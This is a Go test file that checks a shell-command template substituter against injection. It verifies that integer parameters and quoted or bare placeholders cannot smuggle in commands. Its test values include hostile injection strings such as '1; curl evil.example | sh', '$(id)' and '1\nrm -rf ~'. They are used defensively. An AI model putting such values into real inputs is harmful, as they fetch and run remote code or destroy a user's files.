package temptool

import (
	"os/exec"
	"strings"
	"testing"

	. "github.com/cmcoffee/gohort/core"
)

// A parameter goes into a shell command bare only when its value is literally
// a number or a boolean; the declared type is not enough.

func TestADeclaredIntegerCannotCarryACommand(t *testing.T) {
	params := map[string]ToolParam{"n": {Type: "integer"}, "flag": {Type: "boolean"}}
	for _, v := range []any{"1; curl evil.example | sh", "$(id)", "1\nrm -rf ~", "true && reboot"} {
		out, err := substitute("head -n {n} file", params, map[string]any{"n": v})
		if err != nil {
			t.Fatal(err)
		}
		if !strings.Contains(out, "'") {
			t.Errorf("%q went into the command unquoted: %s", v, out)
		}
	}
	for v, want := range map[any]string{float64(3): "head -n 3 file", "7": "head -n 7 file", " 2\n": "head -n 2 file"} {
		out, _ := substitute("head -n {n} file", params, map[string]any{"n": v})
		if out != want {
			t.Errorf("%q: got %q, want %q", v, out, want)
		}
	}
}

// An author who wraps a placeholder in quotes of their own, '{x}' or "{x}",
// still gets the value as one literal string. Quoting it again closed their
// quotes around it and left it bare, so a value could run a command. Checked
// by running each rendered line through a real shell.
func TestAQuotedPlaceholderStaysOneLiteralValue(t *testing.T) {
	sh, err := exec.LookPath("sh")
	if err != nil {
		t.Skip("no sh here")
	}
	params := map[string]ToolParam{"x": {Type: "string"}}
	values := []string{
		`plain`,
		`it's here`,
		`; echo INJECTED`,
		`'; echo INJECTED; '`,
		`$(echo INJECTED)`,
		"`echo INJECTED`",
		`"; echo INJECTED; "`,
		`\"; echo INJECTED; \"`,
		`$HOME and \ and "quotes"`,
		`line one
line two`,
	}
	// The last: escaped quote marks are text, not quotes, so the placeholder
	// between them is bare and quoted whole.
	for _, tmpl := range []string{`printf '%s' {x}`, `printf '%s' '{x}'`, `printf '%s' "{x}"`, `printf '%s' "say: {x}!"`, `printf '%s' 'say: {x}!'`, `printf '%s' \"{x}\"`} {
		for _, v := range values {
			cmd, err := substitute(tmpl, params, map[string]any{"x": v})
			if err != nil {
				t.Fatal(err)
			}
			out, err := exec.Command(sh, "-c", cmd).CombinedOutput()
			if err != nil {
				t.Errorf("%s with %q: the command broke: %v %s (%s)", tmpl, v, err, out, cmd)
				continue
			}
			want := v
			if strings.Contains(tmpl, "say: ") {
				want = "say: " + v + "!"
			}
			if strings.Contains(tmpl, `\"`) {
				want = `"` + v + `"`
			}
			if string(out) != want {
				t.Errorf("%s with %q printed %q, want the value as it is (rendered %s)", tmpl, v, out, cmd)
			}
		}
	}
}
